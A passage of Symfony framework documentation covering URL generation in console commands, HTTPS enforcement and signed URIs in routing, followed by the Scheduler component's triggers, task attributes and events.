:ref:`generating URLs in services <routing-generating-urls-in-services>`. The
only difference is that commands are not executed in the HTTP context. Therefore,
if you generate absolute URLs, you'll get ``http://localhost/`` as the host name
instead of your real host name.

The solution is to configure the ``default_uri`` option to define the
"request context" used by commands when they generate URLs:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/routing.yaml
        framework:
            router:
                # ...
                default_uri: 'https://example.org/my/path/'

    .. code-block:: xml

        <!-- config/packages/routing.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:router default-uri="https://example.org/my/path/">
                    <!-- ... -->
                </framework:router>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/routing.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->router()->defaultUri('https://example.org/my/path/');
        };

Now you'll get the expected results when generating URLs in your commands::

    // src/Command/SomeCommand.php
    namespace App\Command;

    use Symfony\Component\Console\Command\Command;
    use Symfony\Component\Console\Input\InputInterface;
    use Symfony\Component\Console\Output\OutputInterface;
    use Symfony\Component\Routing\Generator\UrlGeneratorInterface;
    // ...

    class SomeCommand extends Command
    {
        public function __construct(private UrlGeneratorInterface $urlGenerator)
        {
            parent::__construct();
        }

        protected function execute(InputInterface $input, OutputInterface $output): int
        {
            // generate a URL with no route arguments
            $signUpPage = $this->urlGenerator->generate('sign_up');

            // generate a URL with route arguments
            $userProfilePage = $this->urlGenerator->generate('user_profile', [
                'username' => $user->getUserIdentifier(),
            ]);

            // by default, generated URLs are "absolute paths". Pass a third optional
            // argument to generate different URIs (e.g. an "absolute URL")
            $signUpPage = $this->urlGenerator->generate('sign_up', [], UrlGeneratorInterface::ABSOLUTE_URL);

            // when a route is localized, Symfony uses by default the current request locale
            // pass a different '_locale' value if you want to set the locale explicitly
            $signUpPageInDutch = $this->urlGenerator->generate('sign_up', ['_locale' => 'nl']);

            // ...
        }
    }

.. note::

    By default, the URLs generated for web assets use the same ``default_uri``
    value, but you can change it with the ``asset.request_context.base_path``
    and ``asset.request_context.secure`` container parameters.

Checking if a Route Exists
~~~~~~~~~~~~~~~~~~~~~~~~~~

In highly dynamic applications, it may be necessary to check whether a route
exists before using it to generate a URL. In those cases, don't use the
:method:`Symfony\\Component\\Routing\\Router::getRouteCollection` method because
that regenerates the routing cache and slows down the application.

Instead, try to generate the URL and catch the
:class:`Symfony\\Component\\Routing\\Exception\\RouteNotFoundException` thrown
when the route doesn't exist::

    use Symfony\Component\Routing\Exception\RouteNotFoundException;

    // ...

    try {
        $url = $this->router->generate($routeName, $routeParameters);
    } catch (RouteNotFoundException $e) {
        // the route is not defined...
    }

.. _routing-force-https:

Forcing HTTPS on Generated URLs
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

.. note::

    If your server runs behind a proxy that terminates SSL, make sure to
    :doc:`configure Symfony to work behind a proxy </deployment/proxies>`

    The configuration for the scheme is only used for non-HTTP requests.
    The ``schemes`` option together with incorrect proxy configuration will
    lead to a redirect loop.

By default, generated URLs use the same HTTP scheme as the current request.
In console commands, where there is no HTTP request, URLs use ``http`` by
default. You can change this per command (via the router's ``getContext()``
method) or globally with these configuration parameters:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        parameters:
            router.request_context.scheme: 'https'
            asset.request_context.secure: true

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <parameters>
                <parameter key="router.request_context.scheme">https</parameter>
                <parameter key="asset.request_context.secure">true</parameter>
            </parameters>

        </container>

    .. code-block:: php

        // config/services.php
        $container->parameters()
            ->set('router.request_context.scheme', 'https')
            ->set('asset.request_context.secure', true)
        ;

Outside of console commands, use the ``schemes`` option to define the scheme of
each route explicitly:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/SecurityController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\HttpFoundation\Response;
        use Symfony\Component\Routing\Attribute\Route;

        class SecurityController extends AbstractController
        {
            #[Route('/login', name: 'login', schemes: ['https'])]
            public function login(): Response
            {
                // ...
            }
        }

    .. code-block:: yaml

        # config/routes.yaml
        login:
            path:       /login
            controller: App\Controller\SecurityController::login
            schemes:    [https]

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>

        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing https://symfony.com/schema/routing/routing-1.0.xsd">

            <route id="login" path="/login" schemes="https"
                   controller="App\Controller\SecurityController::login"/>
        </routes>

    .. code-block:: php

        // config/routes.php
        use App\Controller\SecurityController;
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return static function (RoutingConfigurator $routes): void {
            $routes->add('login', '/login')
                ->controller([SecurityController::class, 'login'])
                ->schemes(['https'])
            ;
        };

The URL generated for the ``login`` route will always use HTTPS. This means that
when using the ``path()`` Twig function to generate URLs, you may get an
absolute URL instead of a relative URL if the HTTP scheme of the original
request is different from the scheme used by the route:

.. code-block:: twig

    {# if the current scheme is HTTPS, generates a relative URL: /login #}
    {{ path('login') }}

    {# if the current scheme is HTTP, generates an absolute URL to change
       the scheme: https://example.com/login #}
    {{ path('login') }}

The scheme requirement is also enforced for incoming requests. If you try to
access the ``/login`` URL with HTTP, you will automatically be redirected to the
same URL, but with the HTTPS scheme.

If you want to force a group of routes to use HTTPS, you can define the default
scheme when importing them. The following example forces HTTPS on all routes
defined as attributes:

.. configuration-block::

    .. code-block:: yaml

        # config/routes/attributes.yaml
        controllers:
            resource: '../../src/Controller/'
            type: attribute
            schemes: [https]

    .. code-block:: xml

        <!-- config/routes/attributes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <import resource="../../src/Controller/" type="attribute" schemes="https"/>
        </routes>

    .. code-block:: php

        // config/routes/attributes.php
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return static function (RoutingConfigurator $routes): void {
            $routes->import('../../src/Controller/', 'attribute')
                ->schemes(['https'])
            ;
        };

.. note::

    The Security component provides
    :doc:`another way to enforce HTTP or HTTPS </security/force_https>`
    via the ``requires_channel`` setting.

Signing URIs
~~~~~~~~~~~~

A signed URI is an URI that includes a hash value that depends on the contents of
the URI. This way, you can later check the integrity of the signed URI by
recomputing its hash value and comparing it with the hash included in the URI.

Symfony provides a utility to sign URIs via the :class:`Symfony\\Component\\HttpFoundation\\UriSigner`
service, which you can inject in your services or controllers::

    // src/Service/SomeService.php
    namespace App\Service;

    use Symfony\Component\HttpFoundation\UriSigner;

    class SomeService
    {
        public function __construct(
            private UriSigner $uriSigner,
        ) {
        }

        public function someMethod(): void
        {
            // ...

            // generate a URL yourself or get it somehow...
            $url = 'https://example.com/foo/bar?sort=desc';

            // sign the URL (it adds a query parameter called '_hash')
            $signedUrl = $this->uriSigner->sign($url);
            // $url = 'https://example.com/foo/bar?sort=desc&_hash=e4a21b9'

            // check the URL signature
            $uriSignatureIsValid = $this->uriSigner->check($signedUrl);
            // $uriSignatureIsValid = true

            // if you have access to the current Request object, you can use this
            // other method to pass the entire Request object instead of the URI:
            $uriSignatureIsValid = $this->uriSigner->checkRequest($request);
        }
    }

For security reasons, it's common to make signed URIs expire after some time
(e.g. when using them to reset user credentials). By default, signed URIs don't
expire, but you can define an expiration date/time using the ``$expiration``
argument of :phpmethod:`Symfony\\Component\\HttpFoundation\\UriSigner::sign`::

    // src/Service/SomeService.php
    namespace App\Service;

    use Symfony\Component\HttpFoundation\UriSigner;

    class SomeService
    {
        public function __construct(
            private UriSigner $uriSigner,
        ) {
        }

        public function someMethod(): void
        {
            // ...

            // generate a URL yourself or get it somehow...
            $url = 'https://example.com/foo/bar?sort=desc';

            // sign the URL with an explicit expiration date
            $signedUrl = $this->uriSigner->sign($url, new \DateTimeImmutable('2050-01-01'));
            // $signedUrl = 'https://example.com/foo/bar?sort=desc&_expiration=2524608000&_hash=e4a21b9'

            // if you pass a \DateInterval, it will be added from now to get the expiration date
            $signedUrl = $this->uriSigner->sign($url, new \DateInterval('PT10S'));  // valid for 10 seconds from now
            // $signedUrl = 'https://example.com/foo/bar?sort=desc&_expiration=1712414278&_hash=e4a21b9'

            // you can also use a timestamp in seconds
            $signedUrl = $this->uriSigner->sign($url, 4070908800); // timestamp for the date 2099-01-01
            // $signedUrl = 'https://example.com/foo/bar?sort=desc&_expiration=4070908800&_hash=e4a21b9'
        }
    }

.. note::

    The expiration date/time is included in the signed URIs as a timestamp via
    the ``_expiration`` query parameter.

.. versionadded:: 7.1

    The feature to add an expiration date for a signed URI was introduced in Symfony 7.1.

Troubleshooting
---------------

Here are some common errors you might see while working with routing:

.. code-block:: text

    Controller "App\\Controller\\BlogController::show()" requires that you
    provide a value for the "$slug" argument.

This happens when your controller method has an argument (e.g. ``$slug``)::

    public function show(string $slug): Response
    {
        // ...
    }

But your route path does *not* have a ``{slug}`` parameter (e.g. it is
``/blog/show``). Add a ``{slug}`` to your route path: ``/blog/show/{slug}`` or
give the argument a default value (i.e. ``$slug = null``).

.. code-block:: text

    Some mandatory parameters are missing ("slug") to generate a URL for route
    "blog_show".

This means that you're trying to generate a URL to the ``blog_show`` route but
you are *not* passing a ``slug`` value (which is required, because it has a
``{slug}`` parameter in the route path). To fix this, pass a ``slug`` value when
generating the route::

    $this->generateUrl('blog_show', ['slug' => 'slug-value']);

or, in Twig:

.. code-block:: twig

    {{ path('blog_show', {slug: 'slug-value'}) }}

Learn more about Routing
------------------------

.. toctree::
    :maxdepth: 1
    :glob:

    routing/*

.. _`PHP regular expressions`: https://www.php.net/manual/en/book.pcre.php
.. _`PCRE Unicode properties`: https://www.php.net/manual/en/regexp.reference.unicode.php
.. _`FOSJsRoutingBundle`: https://github.com/FriendsOfSymfony/FOSJsRoutingBundle
.. _`backed enumerations`: https://www.php.net/manual/en/language.enumerations.backed.php
Scheduler
=========

The scheduler component manages task scheduling within your PHP application, like
running a task each night at 3 AM, every two weeks except for holidays or any
other custom schedule you might need.

This component is useful to schedule tasks like maintenance (database cleanup,
cache clearing, etc.), background processing (queue handling, data synchronization,
etc.), periodic data updates, scheduled notifications (emails, alerts), and more.

This document focuses on using the Scheduler component in the context of a full
stack Symfony application.

Installation
------------

In applications using :ref:`Symfony Flex <symfony-flex>`, run this command to
install the scheduler component:

.. code-block:: terminal

    $ composer require symfony/scheduler

Symfony Scheduler Basics
------------------------

The main benefit of using this component is that automation is managed by your
application, which gives you a lot of flexibility that is not possible with cron
jobs (e.g. dynamic schedules based on certain conditions).

At its core, the Scheduler component allows you to create a task (called a message)
that is executed by a service and repeated on some schedule. It has some similarities
with the :doc:`Symfony Messenger </components/messenger>` component (such as message,
handler, bus, transport, etc.), but the main difference is that Messenger can't
deal with repetitive tasks at regular intervals.

Consider the following example of an application that sends some reports to
customers on a scheduled basis. First, create a Scheduler message that represents
the task of creating a report::

    // src/Scheduler/Message/SendDailySalesReports.php
    namespace App\Scheduler\Message;

    class SendDailySalesReports
    {
        public function __construct(private int $id) {}

        public function getId(): int
        {
            return $this->id;
        }
    }

Next, create the handler that processes that kind of message::

    // src/Scheduler/Handler/SendDailySalesReportsHandler.php
    namespace App\Scheduler\Handler;

    use App\Scheduler\Message\SendDailySalesReports;
    use Symfony\Component\Messenger\Attribute\AsMessageHandler;

    #[AsMessageHandler]
    class SendDailySalesReportsHandler
    {
        public function __invoke(SendDailySalesReports $message)
        {
            // ... do some work to send the report to the customers
        }
    }

Instead of sending these messages immediately (as in the Messenger component),
the goal is to create them based on a predefined frequency. This is possible
thanks to :class:`Symfony\\Component\\Scheduler\\Messenger\\SchedulerTransport`,
a special transport for Scheduler messages.

The transport generates, autonomously, various messages according to the assigned
frequencies. The following images illustrate the differences between the
processing of messages in Messenger and Scheduler components:

In Messenger:

.. image:: /_images/components/messenger/basic_cycle.png
    :alt: Symfony Messenger basic cycle

In Scheduler:

.. image:: /_images/components/scheduler/scheduler_cycle.png
    :alt: Symfony Scheduler basic cycle

Another important difference is that messages in the Scheduler component are
recurring. They are represented via the :class:`Symfony\\Component\\Scheduler\\RecurringMessage`
class.

.. _scheduler_attaching-recurring-messages:

Attaching Recurring Messages to a Schedule
------------------------------------------

The configuration of the message frequency is stored in a class that implements
:class:`Symfony\\Component\\Scheduler\\ScheduleProviderInterface`. This provider
uses the method :method:`Symfony\\Component\\Scheduler\\ScheduleProviderInterface::getSchedule`
to return a schedule containing the different recurring messages.

The :class:`Symfony\\Component\\Scheduler\\Attribute\\AsSchedule` attribute,
which by default references the schedule named ``default``, allows you to register
on a particular schedule::

    // src/Scheduler/SaleTaskProvider.php
    namespace App\Scheduler;

    use Symfony\Component\Scheduler\Attribute\AsSchedule;
    use Symfony\Component\Scheduler\Schedule;
    use Symfony\Component\Scheduler\ScheduleProviderInterface;

    #[AsSchedule]
    class SaleTaskProvider implements ScheduleProviderInterface
    {
        public function getSchedule(): Schedule
        {
            // ...
        }
    }

.. tip::

    By default, the schedule name is ``default`` and the transport name follows
    the syntax: ``scheduler_nameofyourschedule`` (e.g. ``scheduler_default``).

.. tip::

    `Memoizing`_ your schedule is a good practice to prevent unnecessary reconstruction
    if the ``getSchedule()`` method is checked by another service.

Scheduling Recurring Messages
-----------------------------

A ``RecurringMessage`` is a message associated with a trigger, which configures
the frequency of the message. Symfony provides different types of triggers:

:class:`Symfony\\Component\\Scheduler\\Trigger\\CronExpressionTrigger`
    A trigger that uses the same syntax as the `cron command-line utility`_.

:class:`Symfony\\Component\\Scheduler\\Trigger\\CallbackTrigger`
    A trigger that uses a callback to determine the next run date.

:class:`Symfony\\Component\\Scheduler\\Trigger\\ExcludeTimeTrigger`
    A trigger that excludes certain times from a given trigger.

:class:`Symfony\\Component\\Scheduler\\Trigger\\JitterTrigger`
    A trigger that adds a random jitter to a given trigger. The jitter is some
    time that is added to the original triggering date/time. This
    allows to distribute the load of the scheduled tasks instead of running them
    all at the exact same time.

:class:`Symfony\\Component\\Scheduler\\Trigger\\PeriodicalTrigger`
    A trigger that uses a ``DateInterval`` to determine the next run date.

The :class:`Symfony\\Component\\Scheduler\\Trigger\\JitterTrigger` and
:class:`Symfony\\Component\\Scheduler\\Trigger\\ExcludeTimeTrigger` are decorators
and modify the behavior of the trigger they wrap. You can get the decorated
trigger as well as the decorators by calling the
:method:`Symfony\\Component\\Scheduler\\Trigger\\AbstractDecoratedTrigger::inner`
and :method:`Symfony\\Component\\Scheduler\\Trigger\\AbstractDecoratedTrigger::decorators`
methods::

    $trigger = new ExcludeTimeTrigger(new JitterTrigger(CronExpressionTrigger::fromSpec('#midnight', new MyMessage()));

    $trigger->inner(); // CronExpressionTrigger
    $trigger->decorators(); // [ExcludeTimeTrigger, JitterTrigger]

Most of them can be created via the :class:`Symfony\\Component\\Scheduler\\RecurringMessage`
class, as shown in the following examples.

Cron Expression Triggers
~~~~~~~~~~~~~~~~~~~~~~~~

Before using cron triggers, you have to install the following dependency:

.. code-block:: terminal

    $ composer require dragonmantank/cron-expression

Then, define the trigger date/time using the same syntax as the
`cron command-line utility`_::

    RecurringMessage::cron('* * * * *', new Message());

    // optionally you can define the timezone used by the cron expression
    RecurringMessage::cron('* * * * *', new Message(), new \DateTimeZone('Africa/Malabo'));

.. tip::

    Check out the `crontab.guru website`_ if you need help to construct/understand
    cron expressions.

You can also use some special values that represent common cron expressions:

* ``@yearly``, ``@annually`` - Run once a year, midnight, Jan. 1 - ``0 0 1 1 *``
* ``@monthly`` - Run once a month, midnight, first of month - ``0 0 1 * *``
* ``@weekly`` - Run once a week, midnight on Sun - ``0 0 * * 0``
* ``@daily``, ``@midnight`` - Run once a day, midnight - ``0 0 * * *``
* ``@hourly`` - Run once an hour, first minute - ``0 * * * *``

For example::

    RecurringMessage::cron('@daily', new Message());

.. tip::

    You can also define cron tasks using :ref:`the AsCronTask attribute <scheduler-attributes-cron-task>`.

Hashed Cron Expressions
.......................

If you have many triggers scheduled at same time (for example, at midnight, ``0 0 * * *``)
this will create a very long running list of schedules at that exact time.
This may cause an issue if a task has a memory leak.

You can add a hash symbol (``#``) in expressions to generate random values.
Athough the values are random, they are predictable and consistent because they
are generated based on the message. A message with string representation ``my task``
and a defined frequency of ``# # * * *`` will have an idempotent frequency
of ``56 20 * * *`` (every day at 8:56pm).

You can also use hash ranges (``#(x-y)``) to define the list of possible values
for that random part. For example, ``# #(0-7) * * *`` means daily, some time
between midnight and 7am. Using the ``#`` without a range creates a range of any
valid value for the field. ``# # # # #`` is short for ``#(0-59) #(0-23) #(1-28)
#(1-12) #(0-6)``.

You can also use some special values that represent common hashed cron expressions:

======================  ========================================================================
Alias                   Converts to
======================  ========================================================================
``#hourly``             ``# * * * *`` (at some minute every hour)
``#daily``              ``# # * * *`` (at some time every day)
``#weekly``             ``# # * * #`` (at some time every week)
``#weekly@midnight``    ``# #(0-2) * * #`` (at ``#midnight`` one day every week)
``#monthly``            ``# # # * *`` (at some time on some day, once per month)
``#monthly@midnight``   ``# #(0-2) # * *`` (at ``#midnight`` on some day, once per month)
``#annually``           ``# # # # *`` (at some time on some day, once per year)
``#annually@midnight``  ``# #(0-2) # # *``  (at ``#midnight`` on some day, once per year)
``#yearly``             ``# # # # *`` alias for ``#annually``
``#yearly@midnight``    ``# #(0-2) # # *`` alias for ``#annually@midnight``
``#midnight``           ``# #(0-2) * * *`` (at some time between midnight and 2:59am, every day)
======================  ========================================================================

For example::

    RecurringMessage::cron('#midnight', new Message());

.. note::

    The day of month range is ``1-28``, this is to account for February
    which has a minimum of 28 days.

Periodical Triggers
~~~~~~~~~~~~~~~~~~~

These triggers allows to configure the frequency using different data types
(``string``, ``integer``, ``DateInterval``). They also support the `relative formats`_
defined by PHP datetime functions::

    RecurringMessage::every('10 seconds', new Message());
    RecurringMessage::every('3 weeks', new Message());
    RecurringMessage::every('first Monday of next month', new Message());

    $from = new \DateTimeImmutable('13:47', new \DateTimeZone('Europe/Paris'));
    $until = '2023-06-12';
    RecurringMessage::every('first Monday of next month', new Message(), $from, $until);

.. tip::

    You can also define periodic tasks using :ref:`the AsPeriodicTask attribute <scheduler-attributes-periodic-task>`.

Custom Triggers
~~~~~~~~~~~~~~~

Custom triggers allow to configure any frequency dynamically. They are created
as services that implement :class:`Symfony\\Component\\Scheduler\\Trigger\\TriggerInterface`.

For example, if you want to send customer reports daily except for holiday periods::

    // src/Scheduler/Trigger/NewUserWelcomeEmailHandler.php
    namespace App\Scheduler\Trigger;

    class ExcludeHolidaysTrigger implements TriggerInterface
    {
        public function __construct(private TriggerInterface $inner)
        {
        }

        // use this method to give a nice displayable name to
        // identify your trigger (it eases debugging)
        public function __toString(): string
        {
            return $this->inner.' (except holidays)';
        }

        public function getNextRunDate(\DateTimeImmutable $run): ?\DateTimeImmutable
        {
            if (!$nextRun = $this->inner->getNextRunDate($run)) {
                return null;
            }

            // loop until you get the next run date that is not a holiday
            while (!$this->isHoliday($nextRun) {
                $nextRun = $this->inner->getNextRunDate($nextRun);
            }

            return $nextRun;
        }

        private function isHoliday(\DateTimeImmutable $timestamp): bool
        {
            // add some logic to determine if the given $timestamp is a holiday
            // return true if holiday, false otherwise
        }
    }

Then, define your recurring message::

    RecurringMessage::trigger(
        new ExcludeHolidaysTrigger(
            CronExpressionTrigger::fromSpec('@daily'),
        ),
        new SendDailySalesReports('...'),
    );

Finally, the recurring messages has to be attached to a schedule::

    // src/Scheduler/SaleTaskProvider.php
    namespace App\Scheduler;

    #[AsSchedule('uptoyou')]
    class SaleTaskProvider implements ScheduleProviderInterface
    {
        public function getSchedule(): Schedule
        {
            return $this->schedule ??= (new Schedule())
                ->with(
                    RecurringMessage::trigger(
                        new ExcludeHolidaysTrigger(
                            CronExpressionTrigger::fromSpec('@daily'),
                        ),
                        new SendDailySalesReports()
                    ),
                    RecurringMessage::cron('3 8 * * 1', new CleanUpOldSalesReport())
                );
        }
    }

So, this ``RecurringMessage`` will encompass both the trigger, defining the
generation frequency of the message, and the message itself, the one to be
processed by a specific handler.

But what is interesting to know is that it also provides you with the ability to
generate your message(s) dynamically.

A Dynamic Vision for the Messages Generated
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This proves particularly useful when the message depends on data stored in
databases or third-party services.

Following the previous example of reports generation: they depend on customer requests.
Depending on the specific demands, any number of reports may need to be generated
at a defined frequency. For these dynamic scenarios, it gives you the capability
to dynamically define our message(s) instead of statically. This is achieved by
defining a :class:`Symfony\\Component\\Scheduler\\Trigger\\CallbackMessageProvider`.

Essentially, this means you can dynamically, at runtime, define your message(s)
through a callback that gets executed each time the scheduler transport
checks for messages to be generated::

    // src/Scheduler/SaleTaskProvider.php
    namespace App\Scheduler;

    #[AsSchedule('uptoyou')]
    class SaleTaskProvider implements ScheduleProviderInterface
    {
        public function getSchedule(): Schedule
        {
            return $this->schedule ??= (new Schedule())
                ->with(
                    RecurringMessage::trigger(
                        new ExcludeHolidaysTrigger(
                            CronExpressionTrigger::fromSpec('@daily'),
                        ),
                    // instead of being static as in the previous example
                    new CallbackMessageProvider([$this, 'generateReports'], 'foo')),
                    RecurringMessage::cron(‘3 8 * * 1’, new CleanUpOldSalesReport())
                );
        }

        public function generateReports(MessageContext $context)
        {
            // ...
            yield new SendDailySalesReports();
            yield new ReportSomethingReportSomethingElse();
        }
    }

Exploring Alternatives for Crafting your Recurring Messages
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

There is also another way to build a ``RecurringMessage``, and this can be done
by adding one of these attributes to a service or a command:
:class:`Symfony\\Component\\Scheduler\\Attribute\\AsPeriodicTask` and
:class:`Symfony\\Component\\Scheduler\\Attribute\\AsCronTask`.

For both of these attributes, you have the ability to define the schedule to
use via the ``schedule``option. By default, the ``default`` named schedule will
be used. Also, by default, the ``__invoke`` method of your service will be called
but, it's also possible to specify the method to call via the ``method``option
and you can define arguments via ``arguments``option if necessary.

.. _scheduler-attributes-cron-task:

``AsCronTask`` Example
......................

This is the most basic way to define a cron trigger with this attribute::

    // src/Scheduler/Task/SendDailySalesReports.php
    namespace App\Scheduler\Task;

    use Symfony\Component\Scheduler\Attribute\AsCronTask;

    #[AsCronTask('0 0 * * *')]
    class SendDailySalesReports
    {
        public function __invoke()
        {
            // ...
        }
    }

The attribute takes more parameters to customize the trigger::

    // adds randomly up to 6 seconds to the trigger time to avoid load spikes
    #[AsCronTask('0 0 * * *', jitter: 6)]

    // defines the method name to call instead as well as the arguments to pass to it
    #[AsCronTask('0 0 * * *', method: 'sendEmail', arguments: ['email' => 'admin@example.com'])]

    // defines the timezone to use
    #[AsCronTask('0 0 * * *', timezone: 'Africa/Malabo')]

.. _scheduler-attributes-periodic-task:

``AsPeriodicTask`` Example
..........................

This is the most basic way to define a periodic trigger with this attribute::

    // src/Scheduler/Task/SendDailySalesReports.php
    namespace App\Scheduler\Task;

    use Symfony\Component\Scheduler\Attribute\AsPeriodicTask;

    #[AsPeriodicTask(frequency: '1 day', from: '2022-01-01', until: '2023-06-12')]
    class SendDailySalesReports
    {
        public function __invoke()
        {
            // ...
        }
    }

.. note::

    The ``from`` and ``until`` options are optional. If not defined, the task
    will be executed indefinitely.

The ``#[AsPeriodicTask]`` attribute takes many parameters to customize the trigger::

    // the frequency can be defined as an integer representing the number of seconds
    #[AsPeriodicTask(frequency: 86400)]

    // adds randomly up to 6 seconds to the trigger time to avoid load spikes
    #[AsPeriodicTask(frequency: '1 day', jitter: 6)]

    // defines the method name to call instead as well as the arguments to pass to it
    #[AsPeriodicTask(frequency: '1 day', method: 'sendEmail', arguments: ['email' => 'admin@symfony.com'])]
    class SendDailySalesReports
    {
        public function sendEmail(string $email): void
        {
            // ...
        }
    }

    // defines the timezone to use
    #[AsPeriodicTask(frequency: '1 day', timezone: 'Africa/Malabo')]

Managing Scheduled Messages
---------------------------

Modifying Scheduled Messages in Real-Time
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

While planning a schedule in advance is beneficial, it is rare for a schedule to
remain static over time. After a certain period, some ``RecurringMessages`` may
become obsolete, while others may need to be integrated into the planning.

As a general practice, to alleviate a heavy workload, the recurring messages in
the schedules are stored in memory to avoid recalculation each time the scheduler
transport generates messages. However, this approach can have a flip side.

Following the same report generation example as above, the company might do some
promotions during specific periods (and they need to be communicated repetitively
throughout a given timeframe) or the deletion of old reports needs to be halted
under certain circumstances.

This is why the ``Scheduler`` incorporates a mechanism to dynamically modify the
schedule and consider all changes in real-time.

Strategies for Adding, Removing, and Modifying Entries within the Schedule
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The schedule provides you with the ability to :method:`Symfony\\Component\\Scheduler\Schedule::add`,
:method:`Symfony\\Component\\Scheduler\Schedule::remove`, or :method:`Symfony\\Component\\Scheduler\Schedule::clear`
all associated recurring messages, resulting in the reset and recalculation of
the in-memory stack of recurring messages.

For instance, for various reasons, if there's no need to generate a report, a
callback can be employed to conditionally skip generating of some or all reports.

However, if the intention is to completely remove a recurring message and its recurrence,
the :class:`Symfony\\Component\\Scheduler\Schedule` offers a :method:`Symfony\\Component\\Scheduler\Schedule::remove`
or a :method:`Symfony\\Component\\Scheduler\Schedule::removeById` method. This can
be particularly useful in your case, especially if you need to halt the generation
of the recurring message, which involves deleting old reports.

In your handler, you can check a condition and, if affirmative, access the
:class:`Symfony\\Component\\Scheduler\Schedule` and invoke this method::

    // src/Scheduler/SaleTaskProvider.php
    namespace App\Scheduler;

    #[AsSchedule('uptoyou')]
    class SaleTaskProvider implements ScheduleProviderInterface
    {
        public function getSchedule(): Schedule
        {
            $this->removeOldReports = RecurringMessage::cron(‘3 8 * * 1’, new CleanUpOldSalesReport());

            return $this->schedule ??= (new Schedule())
                ->with(
                    // ...
                    $this->removeOldReports;
                );
        }

        // ...

        public function removeCleanUpMessage()
        {
            $this->getSchedule()->getSchedule()->remove($this->removeOldReports);
        }
    }

    // src/Scheduler/Handler/.php
    namespace App\Scheduler\Handler;

    #[AsMessageHandler]
    class CleanUpOldSalesReportHandler
    {
        public function __invoke(CleanUpOldSalesReport $cleanUpOldSalesReport): void
        {
            // do some work here...

            if ($isFinished) {
                $this->mySchedule->removeCleanUpMessage();
            }
        }
    }

Nevertheless, this system may not be the most suitable for all scenarios. Also,
the handler should ideally be designed to process the type of message it is
intended for, without making decisions about adding or removing a new recurring
message.

For instance, if, due to an external event, there is a need to add a recurrent
message aimed at deleting reports, it can be challenging to achieve within the
handler. This is because the handler will no longer be called or executed once
there are no more messages of that type.

However, the Scheduler also features an event system that is integrated into a
Symfony full-stack application by grafting onto Symfony Messenger events. These
events are dispatched through a listener, providing a convenient means to respond.

Managing Scheduled Messages via Events
--------------------------------------

A Strategic Event Handling
~~~~~~~~~~~~~~~~~~~~~~~~~~

The goal is to provide flexibility in deciding when to take action while
preserving decoupling. Three primary event types have been introduced types

* ``PRE_RUN_EVENT``
* ``POST_RUN_EVENT``
* ``FAILURE_EVENT``

Access to the schedule is a crucial feature, allowing effortless addition or
removal of message types. Additionally, it will be possible to access the
currently processed message and its message context.

In consideration of our scenario, you can listen to the ``PRE_RUN_EVENT`` and
check if a certain condition is met. For instance, you might decide to add a
recurring message for cleaning old reports again, with the same or different
configurations, or add any other recurring message(s).

If you had chosen to handle the deletion of the recurring message, you could
have done so in a listener for this event. Importantly, it reveals a specific
feature :method:`Symfony\\Component\\Scheduler\\Event\\PreRunEvent::shouldCancel`
that allows you to prevent the message of the deleted recurring message from
being transferred and processed by its handler::

    // src/Scheduler/SaleTaskProvider.php
    namespace App\Scheduler;

    #[AsSchedule('uptoyou')]
    class SaleTaskProvider implements ScheduleProviderInterface
    {
        public function getSchedule(): Schedule
        {
            $this->removeOldReports = RecurringMessage::cron('3 8 * * 1', new CleanUpOldSalesReport());

            return $this->schedule ??= (new Schedule())
                ->with(
                    // ...
                );
                ->before(function(PreRunEvent $event) {
                    $message = $event->getMessage();
                    $messageContext = $event->getMessageContext();

                    // can access the schedule
                    $schedule = $event->getSchedule()->getSchedule();

                    // can target directly the RecurringMessage being processed
                    $schedule->removeById($messageContext->id);

                    // allow to call the ShouldCancel() and avoid the message to be handled
                        $event->shouldCancel(true);
                }
                ->after(function(PostRunEvent $event) {
                    // Do what you want
                }
                ->onFailure(function(FailureEvent $event) {
                    // Do what you want
                }
        }
    }

Scheduler Events
~~~~~~~~~~~~~~~~

PreRunEvent
...........

**Event Class**: :class:`Symfony\\Component\\Scheduler\\Event\\PreRunEvent`

``PreRunEvent`` allows to modify the :class:`Symfony\\Component\\Scheduler\\Schedule`
or cancel a message before it's consumed::

    use Symfony\Component\EventDispatcher\EventSubscriberInterface;
    use Symfony\Component\Scheduler\Event\PreRunEvent;

